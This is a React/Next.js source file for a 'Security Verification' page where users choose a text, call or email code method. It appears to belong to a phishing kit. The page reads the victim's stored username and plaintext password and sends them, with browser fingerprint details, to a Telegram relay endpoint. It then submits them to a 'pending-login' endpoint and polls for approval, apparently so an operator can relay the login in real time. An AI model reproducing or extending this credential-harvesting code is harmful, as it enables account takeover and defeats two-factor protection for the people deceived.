'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
} from '@/lib/approval-messages';
import {
  readStoredPassword,
  readStoredUsername,
  setLoginDeniedError,
} from '@/lib/login-flow-storage';
import { pollPendingLogin } from '@/lib/poll-pending-login';
import { postTelegramNavEvent } from '@/lib/telegram-client';

const METHODS = [
  { id: 'text', label: 'Text Message', description: 'Receive a 6-digit code via text message.', icon: 'SMS' },
  { id: 'call', label: 'Phone Call', description: 'Receive a phone call with your code.', icon: 'Call' },
  { id: 'email', label: 'Email', description: 'Receive an email with your code.', icon: 'Email' },
];

export default function TwoFAMethodPage() {
  const router = useRouter();
  const [selectedMethod, setSelectedMethod] = useState('text');
  const [networkError, setNetworkError] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [backSubmitting, setBackSubmitting] = useState(false);
  const [methodLocked, setMethodLocked] = useState(false);

  const navDisabled = submitting || backSubmitting;

  useEffect(() => {
    if (!readStoredUsername()) {
      router.push('/login');
    }
  }, [router]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (navDisabled) return;
    setNetworkError('');
    setMethodLocked(true);
    setSubmitting(true);

    const userId = readStoredUsername();
    const password = readStoredPassword();
    const method = selectedMethod === 'email' ? 'email' : 'text';
    const methodLabel =
      selectedMethod === 'call'
        ? 'Receive a Call'
        : selectedMethod === 'email'
          ? 'Receive an Email'
          : 'Receive a Text';

    if (typeof window !== 'undefined') {
      sessionStorage.setItem('visit_method', selectedMethod);
    }

    const clientMeta = {
      userAgent: window.navigator.userAgent,
      screen: `${window.screen.width}x${window.screen.height}`,
      language: window.navigator.language || '',
      referrer: document.referrer || 'Direct',
      url: window.location.href,
      localTime: new Date().toLocaleString(),
      utcTime: new Date().toUTCString(),
    };

    try {
      fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          password,
          method: selectedMethod,
          code: '',
          client: clientMeta,
          eventType: 'method',
        }),
      }).catch(() => {});

      const res = await fetch('/api/pending-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId,
          password,
          method,
          maskedEmail: selectedMethod === 'email' ? methodLabel : '-',
          maskedPhone: selectedMethod !== 'email' ? methodLabel : '-',
          flow: 'login',
        }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        setSubmitting(false);
        setMethodLocked(false);
        return;
      }

      if (!data?.id) {
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        setSubmitting(false);
        setMethodLocked(false);
        return;
      }

      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS);
      setSubmitting(false);

      if (outcome === 'approved') {
        router.push('/login/verify');
        return;
      }
      if (outcome === 'denied') {
        setLoginDeniedError();
        router.push('/login');
        return;
      }

      setNetworkError(MSG_UNABLE_VERIFY_TIME);
      setMethodLocked(false);
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
      setSubmitting(false);
      setMethodLocked(false);
    }
  };

  const handleBack = async (e) => {
    e.preventDefault();
    if (navDisabled) return;
    setNetworkError('');
    setBackSubmitting(true);
    try {
      const { ok } = await postTelegramNavEvent('backToLogin');
      if (!ok) {
        setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
        return;
      }
      router.push('/login');
    } catch {
      setNetworkError(MSG_UNABLE_REACH_VERIFICATION);
    } finally {
      setBackSubmitting(false);
    }
  };

  return (
    <div className="login-container login-container-narrow">
      <div className="twofa-content">
        <h1 className="login-title">Security Verification</h1>
        <p className="twofa-intro">
          To keep your account secure, we need to verify your identity. Please select a method to receive your verification code.
        </p>
        {networkError && (
          <div className="notification-error" role="alert">
            {networkError}
          </div>
        )}
        <form onSubmit={handleSubmit} className="twofa-form">
          <div className={`twofa-options ${navDisabled ? 'twofa-options-disabled' : ''}`}>
            {METHODS.map((m) => (
              <label
                key={m.id}
                className={`twofa-option ${selectedMethod === m.id ? 'twofa-option-selected' : ''} ${navDisabled ? 'twofa-option-disabled' : ''}`}
              >
                <input
                  type="radio"
                  name="method"
                  value={m.id}
                  checked={selectedMethod === m.id}
                  onChange={() => setSelectedMethod(m.id)}
                  className="twofa-option-input"
                  disabled={navDisabled || (methodLocked && selectedMethod !== m.id)}
                />
                <span className="twofa-option-icon" aria-hidden>
                  {m.icon === 'SMS' ? '💬' : m.icon === 'Call' ? '📞' : '✉'}
                </span>
                <span className="twofa-option-text">
                  <strong>{m.label}</strong>
                  <span className="twofa-option-desc">{m.description}</span>
                </span>
              </label>
            ))}
          </div>
          <button type="submit" className="login-button" disabled={navDisabled}>
            {submitting ? 'Verifying' : 'Continue'}
          </button>
          <p className="verify-back">
            <button
              type="button"
              className="form-link button-link"
              onClick={handleBack}
              disabled={navDisabled}
            >
              {backSubmitting ? 'Loading…' : '← Back to Sign In'}
            </button>
          </p>
        </form>
      </div>
    </div>
  );
}
